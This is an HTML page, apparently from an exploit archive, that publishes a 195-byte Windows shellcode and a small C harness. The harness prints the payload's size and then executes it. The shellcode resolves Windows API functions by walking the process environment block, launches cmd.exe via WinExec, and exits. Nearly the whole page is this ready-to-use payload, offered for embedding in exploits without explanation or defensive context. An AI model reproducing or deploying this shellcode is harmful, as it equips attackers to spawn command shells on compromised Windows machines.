<html><head><title>Windows - Allwin WinExec cmd.exe + ExitProcess Shellcode - 195 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Title: Allwin WinExec cmd.exe + ExitProcess Shellcode - 195 bytes
Date: 2010-06-25
Author: RubberDuck
Web: http://bflow.security-portal.cz
Tested on: Win 2k, Win 2003, Win XP Home SP2/SP3 CZ/ENG (32), Win Vista (32)/(64), Win 7 (32)/(64), Win 2k8 (32)
Thanks to: kernelhunter, Lodus, Vrtule and others
*/
 
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
 
int main(){
    unsigned char shellcode[]=
    &quot;\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B&quot;
    &quot;\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9&quot;
    &quot;\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C&quot;
    &quot;\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0&quot;
    &quot;\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B&quot;
    &quot;\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72&quot;
    &quot;\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03&quot;
    &quot;\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47&quot;
    &quot;\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F&quot;
    &quot;\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72&quot;
    &quot;\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66&quot;
    &quot;\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14&quot;
    &quot;\x8E\x03\xD3\x52\x68\x78\x65\x63\x01\xFE&quot;
    &quot;\x4C\x24\x03\x68\x57\x69\x6E\x45\x54\x53&quot;
    &quot;\xFF\xD2\x68\x63\x6D\x64\x01\xFE\x4C\x24&quot;
    &quot;\x03\x6A\x05\x33\xC9\x8D\x4C\x24\x04\x51&quot;
    &quot;\xFF\xD0\x68\x65\x73\x73\x01\x8B\xDF\xFE&quot;
    &quot;\x4C\x24\x03\x68\x50\x72\x6F\x63\x68\x45&quot;
    &quot;\x78\x69\x74\x54\xFF\x74\x24\x20\xFF\x54&quot;
    &quot;\x24\x20\x57\xFF\xD0&quot;;
 
    printf(&quot;Size = %d\n&quot;, strlen(shellcode));
 
    system(&quot;PAUSE&quot;);
 
    ((void (*)())shellcode)();
 
    return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
